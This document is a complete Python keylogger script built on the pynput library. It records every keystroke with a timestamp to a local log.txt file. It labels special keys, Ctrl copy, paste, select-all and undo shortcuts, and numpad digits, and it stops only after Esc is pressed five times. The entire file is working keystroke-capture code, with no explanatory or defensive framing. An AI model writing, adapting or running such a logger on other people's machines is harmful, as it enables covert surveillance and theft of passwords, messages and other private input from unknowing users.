import datetime

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            now = datetime.datetime.now()

            if k.find("backspace") > 0:
                f.write('\n' + str(now) + " > Backspace key ")
            elif k.find("enter") > 0:
                f.write('\n' + str(now) + " > Enter key")
            elif k.find("shift") > 0:
                f.write('\n' + str(now) + " > Shift key ")
            elif k.find("space") > 0:
                f.write('\n' + str(now) + " > Space")
            elif k.find("caps_lock") > 0:
                f.write('\n' + str(now) + " > Maj key ")
            elif k.find("Key.tab") > 0:
                f.write('\n' + str(now) + " > Tab key")

            elif k.find("Key"):

                if k == "\\x03":
                    f.write('\n' + str(now) + " > Shortcut ctrl + c ")

                elif k == "\\x16":
                    f.write('\n' + str(now) + " > Shortcut ctrl + v ")

                elif k == "\\x01":
                    f.write('\n' + str(now) + " > Shortcut ctrl + a ")

                elif k == "\\x1a":
                    f.write('\n' + str(now) + " > Shortcut ctrl + z ")

                elif k == "<96>":
                    f.write('\n' + str(now) + " > 0")

                elif k == "<97>":
                    f.write('\n' + str(now) + " > 1")

                elif k == "<98>":
                    f.write('\n' + str(now) + " > 2")

                elif k == "<99>":
                    f.write('\n' + str(now) + " > 3")

                elif k == "<100>":
                    f.write('\n' + str(now) + " > 4")

                elif k == "<101>":
                    f.write('\n' + str(now) + " > 5")

                elif (k == "<102>"):
                    f.write('\n' + str(now) + " > 6")

                elif k == "<103>":
                    f.write('\n' + str(now) + " > 7")

                elif k == "<104>":
                    f.write('\n' + str(now) + " > 8")

                elif k == "<105>":
                    f.write('\n' + str(now) + " > 9")

                elif k == "<110>":
                    f.write('\n' + str(now) + " > .")

                else:
                    f.write('\n' + str(now) + " > key : " + k)


def on_release(key):
    global exit
    if key == Key.esc:
        exit += 1
        if exit == 5:
            return False


exit = 0
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
